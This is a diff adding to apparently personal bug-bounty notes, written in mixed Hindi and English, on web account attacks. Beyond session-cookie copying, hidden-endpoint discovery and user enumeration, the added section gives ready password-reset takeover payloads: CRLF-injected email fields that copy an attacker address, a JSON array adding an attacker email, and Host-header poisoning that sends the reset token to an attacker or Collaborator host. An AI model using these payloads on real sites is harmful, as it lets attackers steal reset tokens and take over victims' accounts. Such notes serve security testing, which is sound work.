@@ -1,6 +1,12 @@
 
 
+https://t.co/cxKu4z9uZY?amp=1
+
+
+
+
 1 st  method 
+
 ------------------------- session highjacking and session management -------------------------------- 
 
 log in to acc go to the cookie editor copy the cookies and save to the clipboard 
@@ -21,3 +27,17 @@ Js file me se hidden endpoint nikalo or acces karkne ka try karo force browsing 
 1 reset and login page pe jake galat password dalo or response check karo 
 
 register page pe jake existing user dalke dekho respone me ky milta he  	
+
+
+------------------- reset password pe link me token atta he usko hatake dekho ------------ 
+
+
+
+------------- reset password link pe host header hoga token churaya ja sakta he -------- 
+alag alag headers dalke burp-collabrator ka link dalo http me token ayega 
+
+email="victim@mail.tld%0a%0dcc:attacker@mail.tld"
+
+im JSON array: {"email":["victim@mail.tld","atracker@mail.tld"]}
+
+with CLRF: /resetPassword?0a%0dHost:atracker.tld (x-host, true-client-ip, x-forwarded...)	
